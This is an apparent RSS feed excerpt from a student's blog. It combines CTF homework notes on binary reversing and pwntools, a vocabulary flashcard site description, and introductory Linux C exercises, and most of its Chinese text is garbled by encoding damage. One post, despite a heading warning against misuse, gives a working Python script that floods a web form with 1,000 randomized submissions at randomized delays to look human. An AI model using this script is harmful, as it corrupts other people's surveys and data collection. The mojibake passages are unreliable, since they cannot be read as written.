ÈÄô‰∏ÄË°åÂü∑Ë°å‰∫ÜÈÇèËºØNOTÈÅãÁÆó„ÄÇaÁöÑÂÄºÊòØÈùûÈõ∂ÔºåÊâÄ‰ª•ÈÇèËºØNOTÈÅãÁÆóÂæåÁÇ∫0„ÄÇÊâÄ‰ª•Ëº∏Âá∫Â∞áÊòØ0„ÄÇ
&lt;img src=&quot;https://hackmd.io/_uploads/ByMlc61d0.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Hyvlc6yuA.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;‰ΩúÊ•≠2-¬†LinuxÂü∑Ë°åÊ™îÂàÜÊûê&lt;/h2&gt;
&lt;p&gt;CÂéüÁ®ãÂºè
ÁåúÈ°åÁõÆ‰ΩúËÄÖÁöÑÁîüÊó•
&lt;img src=&quot;https://hackmd.io/_uploads/Hy8X56J_R.png&quot; alt=&quot;image&quot;&gt;
Âü∑Ë°åÈÅéÁ®ãÔºö
&lt;img src=&quot;https://hackmd.io/_uploads/ry5456yOC.png&quot; alt=&quot;image&quot;&gt;
Á∏Ω‰∏çÂèØËÉΩÂâõÂ•ΩÈÄöÈùàÂà∞Âà•‰∫∫ÁöÑÁîüÊó•
Âà∞main function‰∏≠Â∞ãÊâæÔºö
&lt;img src=&quot;https://hackmd.io/_uploads/Hkw85p1uA.png&quot; alt=&quot;image&quot;&gt;
ÊØîËºÉÈÅéÁ®ã(1)Ôºö&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyEwcTk_0.png&quot; alt=&quot;image&quot;&gt;
ÊØîËºÉÈÅéÁ®ã(2)Ôºö
&lt;img src=&quot;https://hackmd.io/_uploads/HJodcTJ_A.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SkKKq61_A.png&quot; alt=&quot;image&quot;&gt;
ÂÖ∂ÂØ¶Â•ΩÂÉèÈÄ≤Âà∞VVÂæåÂ∞±ÁúãÂà∞flag‰∫Ü&lt;/p&gt;
&lt;h1&gt;‰ΩúÊ•≠3-¬†ÁµÑÂêàË™ûË®Ä&lt;/h1&gt;
&lt;p&gt;ÈÄôÈ°åË¶ÅÊâæÂà∞ËÉΩË∑≥paradiseÁöÑÂÄº
&lt;img src=&quot;https://hackmd.io/_uploads/rkjq5TkuA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÈÅéÁ®ãÔºö&lt;/li&gt;
&lt;li&gt;&lt;ol&gt;
&lt;li&gt;ÂàùÂßãÁöÑË≥¶ÂÄº:¬†eax=0x03,¬†ebx=???(‰∏çÁü•ÈÅìÊòØÂ§öÂ∞ë),¬†ecx=0x3eb3ac03,¬†edx=0x3eb3ac03„ÄÇ&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;ÈÄ≤ÂÖ•loop,ÁòãÁãÇÂü∑Ë°å‰∏ãÂéª„ÄÇ&lt;/li&gt;
&lt;li&gt;Âú®Âæ™Áí∞‰∏≠,È¶ñÂÖàÊ™¢Êü•eaxÊòØÂê¶Ôºù0,Â¶ÇÊûúÂâáË∑≥ËΩâÂà∞check„ÄÇ&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûúeax‰∏çÁÇ∫Èõ∂,ÂâáÂ∞áecx+edx,ÁÑ∂ÂæåÂ∞áeax-1„ÄÇ&lt;/li&gt;
&lt;li&gt;Âæ™Áí∞ÈáçË§áÂü∑Ë°å,Áõ¥Âà∞eaxËÆäÁÇ∫Èõ∂„ÄÇ&lt;/li&gt;
&lt;li&gt;Áï∂eaxÁÇ∫Èõ∂ÊôÇ,Ë∑≥Âà∞check,ÊØîËºÉebxÂíåecxÁöÑÂÄº„ÄÇ&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûúebxÁ≠âÊñºecx,ÂâáË∑≥ËΩâÂà∞paradise,Â∞áeaxË®≠ÁΩÆÁÇ∫1„ÄÇÂê¶Ââá,Â∞áeaxË®≠ÁΩÆÁÇ∫0„ÄÇ&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Ë¶ÅË∑≥ËΩâÂà∞paradise,ÈúÄË¶ÅÊªøË∂≥ebxÁ≠âÊñºecxÁöÑÊ¢ù‰ª∂„ÄÇÁî±ÊñºecxÁöÑÂàùÂßãÂÄºÁÇ∫0x3eb3ac03,ÊàëÂÄëÂèØ‰ª•ËøΩËπ§Âæ™Áí∞ÁöÑÂü∑Ë°åÈÅéÁ®ã‰æÜË®àÁÆóÂá∫ÊúÄÁµÇecxÁöÑÂÄº„ÄÇ
Âú®Âæ™Áí∞‰∏≠,ecxÁöÑÂÄºÊúÉË¢´‰∏çÊñ∑Âä†‰∏äedxÁöÑÂÄº(0x3eb3ac03)„ÄÇ
Áî±ÊñºeaxÁöÑÂàùÂßãÂÄºÁÇ∫3,Âõ†Ê≠§Âæ™Áí∞ÊúÉÂü∑Ë°å3Ê¨°„ÄÇÊØèÊ¨°Âæ™Áí∞,ecxÁöÑÂÄºÊúÉÂ¢ûÂä†0x3eb3ac03„ÄÇ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ÁµêÊûúÔºö
&lt;code&gt;Ë¶ÅË®àÁÆóÂá∫‰ª•‰∏ãÔºö ecx = 0x3eb3ac03 + 3 * 0x3eb3ac03 &lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/rJFC9TyOR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h1&gt;‰ΩúÊ•≠4-¬†pwntoolsËß£È°å&lt;/h1&gt;
&lt;p&gt;CÂéüÁ®ãÂºè
ÁåúÈ°åÁõÆ‰ΩúËÄÖÁöÑÁîüÊó•
&lt;img src=&quot;https://hackmd.io/_uploads/BkFgi6k_R.png&quot; alt=&quot;image&quot;&gt;
pwnËß£È°åÁ®ãÂºè
&lt;img src=&quot;https://hackmd.io/_uploads/SJMWiayOR.png&quot; alt=&quot;image&quot;&gt;
ÁµêÊûúÔºö
FlagÂ∞±Âô¥Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/SycGspy_C.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Âä†ÂàÜÈ°å main 2
&lt;img src=&quot;https://hackmd.io/_uploads/rkXVipkdR.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HkaEi61O0.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Âä†ÂàÜÈ°å main 3
&lt;img src=&quot;https://hackmd.io/_uploads/SkiHj6ydA.png&quot; alt=&quot;image&quot;&gt;
ÈÄ≤ÂÖ•Âà∞visualÊ®°ÂºèÂæå
‰πüÂèØÁúãÂà∞
0x4012f6
ÊòØmainÁöÑÂú∞ÂùÄ
&lt;img src=&quot;https://hackmd.io/_uploads/S1FIs61_0.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Âä†ÂàÜÈ°å main 6
&lt;img src=&quot;https://hackmd.io/_uploads/By_vi6JuA.png&quot; alt=&quot;image&quot;&gt;
ÈÄ≤ÂÖ•Âà∞visualÊ®°ÂºèÂæåÈÇÑÊòØ
ÂèØ‰ª•ÁúãÂà∞mainÁöÑÂú∞ÂùÄÊòØ0x40121c
&lt;img src=&quot;https://hackmd.io/_uploads/H1w_spJuR.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Thu, 28 Mar 2024 15:40:18 GMT</pubDate></item><item><title>Ëá∫ÁÅ£È´ò‰∏≠ËÅ∑ÁîüÊ¥ªÁ∂≤Ë≥Ωpython</title><link>https://yih-0118.github.io/blog/from/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/from/</guid><description>ÁÅåÁàÜÂà•‰∫∫ÁöÑË°®ÂñÆÔºü</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/from/&quot;&gt;https://yih-0118.github.io/blog/from/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;&lt;strong&gt;‰∏çË¶ÅÊÉ°ÊÑèÂéªÂà∑Âà•‰∫∫ÁöÑË°®ÂñÆÈÄ≤ËÄåÂéªÂΩ±ÈüøÂà•‰∫∫&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;üëé ‰∏çË¶ÅÊÆòÂÆ≥Âà•‰∫∫Â∞èË´ñÊñá&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import re
import time
import random
import numpy as np
import requests as rq

url = &amp;#39;Â°´ÂÖ•Ë°®ÂñÆÈÄ£Áµê&amp;#39;
params = [&amp;#39;ÈÄôÈÇäÂ°´Ê¨Ñ‰ΩçÂêçÁ®±&amp;#39;]
payload = {
    &amp;#39;entry.361687657&amp;#39; : &amp;#39;&amp;#39;,
    &amp;#39;fvv&amp;#39; : &amp;#39;1&amp;#39;,
    &amp;#39;draftResponse&amp;#39; : &amp;#39;[]&amp;#39;,
    &amp;#39;pageHistory&amp;#39; : &amp;#39;0&amp;#39;,
    &amp;#39;fbzx&amp;#39; : &amp;#39;1140157478353573082&amp;#39;
}

num = 1000
period = np.arange(0.5, 5.0, 0.1)
delay = 0.1
while num &amp;gt; 0:
    try:
        payload[&amp;#39;entry.361687657&amp;#39;] = random.choice(params)
        res = rq.post(url, data=payload)
        res.raise_for_status()
        if res.status_code == 200 :
            delay = round(random.choice(period), 2)
            print(&amp;#39;Fill Out : &amp;#39; &amp;#39;f{num}&amp;#39; + payload[&amp;#39;entry.361687657&amp;#39;] + &amp;#39; delay : &amp;#39; + str(delay) + &amp;#39; sec&amp;#39;)
            time.sleep(delay)
    except rq.HTTPError:
        print(&amp;#39;HTTP Error!&amp;#39;)
    
    num -= 1
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sat, 16 Mar 2024 08:05:02 GMT</pubDate></item><item><title>ÊòéÂÄ´ÂñÆÂ≠óÂç°</title><link>https://yih-0118.github.io/blog/%E6%98%8E%E5%80%AB%E5%96%AE%E5%AD%97%E5%8D%A1/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E6%98%8E%E5%80%AB%E5%96%AE%E5%AD%97%E5%8D%A1/</guid><description>ÈñãÂ≠∏ËÄÉ‰æÜ‰∏çÂèäËÆÄ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E6%98%8E%E5%80%AB%E5%96%AE%E5%AD%97%E5%8D%A1/&quot;&gt;https://yih-0118.github.io/blog/%E6%98%8E%E5%80%AB%E5%96%AE%E5%AD%97%E5%8D%A1/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;a href=&quot;https://mlsh-vocabulary.web.app/&quot;&gt;ÊòéÂÄ´ÂñÆÂ≠óÂç°ÈÄ£Áµê&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Á∂≤È†Å‰ªãÁ¥π&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Âú®Á∂≤È†Å‰∏≠ÊúâÂñÆÂ≠óÂç°ÔºåÂÖ∂‰∏≠‰πüÊúâQuizÊ®°Âºè„ÄÇ&lt;/li&gt;
&lt;li&gt;ÂÖ∂‰∏≠QuizÊ®°ÂºèÊúâ&lt;code&gt;ÁúãËã±ÊñáÈÅ∏‰∏≠Êñá&lt;/code&gt;„ÄÅ&lt;code&gt;Áúã‰∏≠ÊñáÈÅ∏Ëã±Êñá&lt;/code&gt;„ÄÅ&lt;code&gt;ÊñáÊÑèÂ≠óÂΩô&lt;/code&gt;„ÄÅ&lt;code&gt;Âú∞ÁçÑÁâàÊñáÊÑèÂ≠óÂΩô&lt;/code&gt;ÂõõÂÄãÈÉ®ÂàÜÔºåÂÖ∂È§òÁöÜÊòØÂñÆÂ≠óÂç°„ÄÇ
&lt;img src=&quot;https://hackmd.io/_uploads/BJyLJCs1A.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÂñÆÂ≠óÂç°&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Â∑¶‰∏äËßíÁÇ∫Á¥¢ÂºïÔºåÂèØ‰ª•Ë™øÊï¥ÂñÆÂ≠óÂç°ÁöÑÈ†ÜÂ∫è!ÔºåÂè≥‰∏ãËßíÊúâÊñπÂêëÈçµÂèØ‰ª•ÂàáÊèõÂñÆÂ≠óÂç°ÔºåÂ∑¶‰∏ãËßíÊúâÂÄãÁáàÊ≥°ÁöÑiconÊàñÊòØÊúóËÆÄ‰ª∂ÔºåÊåâ‰∏ãÂæåÂ∞±ÊúÉÈ°ØÁ§∫‰∏≠ÊñáÊàñÂî∏Âá∫Ë©≤ÂñÆÂ≠ó„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/HJkB1CoJR.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ê∏¨È©óÂçÄ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Êúâ&lt;code&gt;ÁúãËã±ÊñáÈÅ∏‰∏≠Êñá&lt;/code&gt;„ÄÅ&lt;code&gt;Áúã‰∏≠ÊñáÈÅ∏Ëã±Êñá&lt;/code&gt;„ÄÅ&lt;code&gt;ÊñáÊÑèÂ≠óÂΩô&lt;/code&gt;„ÄÅ&lt;code&gt;Âú∞ÁçÑÁâàÊñáÊÑèÂ≠óÂΩô&lt;/code&gt;ÂõõÂÄãÈÉ®ÂàÜÔºåÈÅ∏ÂèñÁ´†ÁØÄÂæåÔºåÂç≥ÂèØÈñãÂßã„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/ByFtyCsJ0.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&amp;lt;!--&lt;/h2&gt;
&lt;h1&gt;Vocabulary Flashcard Overview&lt;/h1&gt;
&lt;h2&gt;Website Introduction&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;There are flashcards and a quiz section on the website!&lt;img src=&quot;https://hackmd.io/_uploads/BysPkA036.png&quot; alt=&quot;yih-0118.github.io_mlsh.github.io_%E5%96%AE%E5%AD%97_indi_va.html(iPhone 6_7_8 Plus)&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The quiz section is divided into &lt;code&gt;ÁúãËã±ÊñáÈÅ∏‰∏≠Êñá&lt;/code&gt;and&lt;code&gt;Áúã‰∏≠ÊñáÈÅ∏Ëã±Êñá&lt;/code&gt;. The rest are flashcards.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Vocabulary Flashcards&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The index on the top left can adjust the order of flashcards. There are directional arrows on the bottom right to switch between cards. There is a lightbulb icon on the bottom left that will reveal the Chinese when pressed. &lt;img src=&quot;https://hackmd.io/_uploads/rJmqJ0RnT.png&quot; alt=&quot;yih-0118.github.io_mlsh.github.io_%E5%96%AE%E5%AD%97_html_vocabulary(L2%20Unit1).html(Pixel 7) (1)&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJfcJ0Cha.png&quot; alt=&quot;yih-0118.github.io_mlsh.github.io_%E5%96%AE%E5%AD%97_html_vocabulary(L2%20Unit1).html(Pixel 7)&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Quiz Section&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;It is divided into two parts &lt;code&gt;ÁúãËã±ÊñáÈÅ∏‰∏≠Êñá&lt;/code&gt;and&lt;code&gt;Áúã‰∏≠ÊñáÈÅ∏Ëã±Êñá&lt;/code&gt;. After selecting a chapter, you can start! &lt;img src=&quot;https://hackmd.io/_uploads/Syhjy002a.png&quot; alt=&quot;yih-0118.github.io_mlsh.github.io_%E5%96%AE%E5%AD%97_e2c.html(Samsung Galaxy S8+)&quot;&gt;
--&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 01 Mar 2024 03:22:03 GMT</pubDate></item><item><title>1/28„ÄÅ1/31 SecurityFocus Online</title><link>https://yih-0118.github.io/blog/isipjan-2024/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/isipjan-2024/</guid><description>Á¨¨‰∏ÄÊ¨°‰∏äISIPÁöÑË™≤</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/isipjan-2024/&quot;&gt;https://yih-0118.github.io/blog/isipjan-2024/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;SecurityFocus Online&lt;/p&gt;
&lt;h1&gt;Linux C&lt;/h1&gt;
&lt;h2&gt;Á∑®Ë≠ØËàáÂü∑Ë°å&lt;/h2&gt;
&lt;h3&gt;ÁØÑ‰æã1:Ëº∏ÂÖ•ËàáËº∏Âá∫&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;

int main(void) {
	float miles;

	printf(&amp;quot;Please enter miles:&amp;quot;);
	scanf(&amp;quot;%f&amp;quot;, &amp;amp;miles);

	float kilometers = miles * 1.6;

	printf(&amp;quot;%f Kilometers&amp;quot;, kilometers);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Âü∑Ë°åËàáÁ∑®Ë≠ØÁµêÊûú&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•
&lt;img src=&quot;https://hackmd.io/_uploads/rk3HLCN9p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÁµêÊûú
&lt;img src=&quot;https://hackmd.io/_uploads/HkY3L045a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÁêÜËß£ËàáÊßãÊÄùÔºöËã±ÈáåËΩâÂÖ¨Èáå
&lt;code&gt;float kilometers = miles * 1.6;&lt;/code&gt;Ëã±ÈáåÊòØÂÖ¨ÈáåÁöÑ1.6ÂÄçÔºåÊâÄ‰ª•Áõ¥Êé•‰πò‰ª•1.6Âç≥ÂèØ&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3&gt;ÁØÑ‰æã3:Ê†ºÂºèÂåñËº∏ÂÖ•ËàáËº∏Âá∫ | ÁÆóË°ìÈÅãÁÆóÂ≠êÔºàArithmetic OperatorsÔºâ&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;math.h&amp;gt;

int main()
{
   float a = 1.0, b = 6.0, c++4.0;
   printf (&amp;quot;%.4f&amp;quot;, sqrt(a+b*c));
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Âü∑Ë°åËàáÁ∑®Ë≠ØÁµêÊûú&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Ëº∏ÂÖ•
&lt;img src=&quot;https://hackmd.io/_uploads/rymXc049a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÈÅéÁ®ã‰∏≠Â†±ÈåØ
&lt;img src=&quot;https://hackmd.io/_uploads/ryp8cAVqT.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;/usr/bin/ld: /tmp/ccFkUuaF.o: in function `main&amp;#39;: PLAYGROUND.c:(.text+0x38): undefined reference to `sqrt&amp;#39; collect2: error: ld returned 1 exit status&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;‰øÆÂæ©Â†±ÈåØ
&lt;code&gt;sqrt&lt;/code&gt;ÈúÄË¶ÅÈÄ£Áµê math ÂáΩÂºèÂ∫´„ÄÇ‰ΩÜÂú®Linux‰∏≠ÔºåÈÄôÂÄãÂáΩÂºèÂ∫´ÈÄöÂ∏∏Ë¢´Á®±ÁÇ∫ libmÔºåÂõ†Ê≠§ÈúÄË¶ÅÂú®Á∑®Ë≠ØÊôÇÂëäË®¥Á∑®Ë≠ØÂô®ÈÄ£Áµê libm„ÄÇÊâÄ‰ª•Á∑®Ë≠ØÊåá‰ª§ÈúÄË¶ÅÈÄôÂéªÂØ´Ôºö
&lt;code&gt;gcc PLAYGROUND.c -lm -o PLAYGROUND&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÁµêÊûú
&lt;img src=&quot;https://hackmd.io/_uploads/rkZvj049p.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÁØÑ‰æã11:Ëø¥ÂúàË®≠Ë®à&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Á∑¥Áøí‰ΩúÊ•≠:Âú®consoleÁ´ØËº∏ÂÖ•n == &amp;gt; Ëº∏Âá∫:n!=1_2_3*‚Ä¶.*nÁöÑÁµêÊûú&lt;ul&gt;
&lt;li&gt;‰ΩøÁî®‰∏âÁ®ÆloopÊäÄË°ìÊí∞ÂØ´&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//FOR LOOP
#include &amp;lt;stdio.h&amp;gt;
int main(){
    int n, i, sum = 1; //Áî±ÊñºÊòØÈöé‰πòÔºåÊïÖsum = 1 ÂøÖÁÇ∫È†êË®≠
    printf(&amp;quot;Enter a positive integer: &amp;quot;);
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
    for (i = 1; i &amp;lt;= n; ++i){
        sum *= i;
    }
    printf(&amp;quot;Sum = %d&amp;quot;, sum);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B17wb1Hca.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkF2lyBqp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//WHILE LOOP
#include &amp;lt;stdio.h&amp;gt;
int main(){
    int n, i, sum = 1;
    printf(&amp;quot;Enter a positive integer: &amp;quot;);
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
    i = 1;
    while (i &amp;lt;= n){
        sum *= i;
        ++i;
    }
    printf(&amp;quot;Sum = %d&amp;quot;, sum);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r13hz1Bc6.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1117kB5p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//DO While LOOP
#include &amp;lt;stdio.h&amp;gt;
int main() {
    int n, i, sum = 1;
    printf(&amp;quot;Enter a positive integer: &amp;quot;);
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
    i = 1;
    do{
      sum *= i;
      ++i;
    } while (i &amp;lt;= n);
    printf(&amp;quot;Sum = %d&amp;quot;, sum);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJUjXyB9T.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByVO4kH5p.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;Á∑¥Áøí‰ΩúÊ•≠:Â∫ï‰∏ãËº∏Âá∫ÁµêÊûúÊòØÂ§öÂ∞ë? and why?&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main(void) {
  int x;
  float y;
  for (x=0, y=50; x&amp;lt;25; x+=5, y/=2)
    printf(&amp;quot;x=%d, y=%4.2f\n&amp;quot;, x, y);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJL2VJrcp.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÁµêÊûú
&lt;img src=&quot;https://hackmd.io/_uploads/Sk8JBJSca.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Ëß£ÈáãÔºö&lt;ol&gt;
&lt;li&gt;ÂàùÂßãÊôÇÔºåx Ë®≠ÁÇ∫ 0Ôºåy Ë®≠ÁÇ∫ 50„ÄÇ&lt;/li&gt;
&lt;li&gt;ÈÄ≤ÂÖ•Âæ™Áí∞ÔºåËº∏Âá∫ x Âíå y ÁöÑÂÄº„ÄÇ&lt;/li&gt;
&lt;li&gt;Âú®ÊØèÊ¨°Âæ™Áí∞‰∏≠Ôºåx ÈÉΩÂ¢ûÂä† 5Ôºåy ÈÉΩÈô§‰ª• 2„ÄÇ&lt;/li&gt;
&lt;li&gt;Âæ™Áí∞ÁµêÊùüÊ¢ù‰ª∂ÊòØ x &amp;lt; 25ÔºåÁï∂ x ÈÅîÂà∞ÊàñË∂ÖÈÅé 25 ÊôÇÔºåÂæ™Áí∞ÂÅúÊ≠¢„ÄÇ&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3&gt;ÁØÑ‰æã16:Ë≤ªÂºèÂ∫èÂàóFibonacci Serie&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ë≤ªÂºèÂ∫èÂàóFibonacci Series: 0 1 1 2 3 5 8 13 21 34&lt;/li&gt;
&lt;li&gt;f(0)=0, f(1)=1, f(n)=f(n-1)+f(n-2)&lt;/li&gt;
&lt;li&gt;Â∫ï‰∏ãÊòØÁî®Ëø¥ÂúàÊñπÂºèË®àÁÆóË≤ªÂºèÂ∫èÂàóFibonacci Serie&lt;/li&gt;
&lt;li&gt;==‰ΩúÊ•≠:‰ΩøÁî®ÈÅûËø¥ÂáΩÊï∏ÊñπÂºèË®àÁÆóË≤ªÂºèÂ∫èÂàóFibonacci Serie==&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;// ÈÅûËø¥
#include &amp;lt;stdio.h&amp;gt;
long long f(int n){
    if(n==0) return 0;
    if(n==1) return 1;
    return f(n-1)+f(n-2);
}
int main(){
    int n;
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
    printf(&amp;quot;%lld&amp;quot;,f(n));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkNlO1H5p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B10GukSqT.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//ÈÅûËø¥Ëß£Ê≥ï2 ÔºàÊ∏õÂ∞ëË®àÁÆóÈáçË§áÈ†ÖÁõÆÔºâ
#include &amp;lt;stdio.h&amp;gt;
long long F[1000005];
long long f(int n) {
    if (n == 0) return 0;
    if (n == 1) return 1;
    if (F[n] != -1) return F[n];
    F[n] = f(n - 1) + f(n - 2);
    return F[n];
}
int main() {
    for (int i = 0; i &amp;lt; 1000000; i++){
        F[i] = -1;
    }
    int n;
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
    printf(&amp;quot;%lld\n&amp;quot;, f(n));
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•ËàáÁµêÊûú&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rySXFyrqT.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
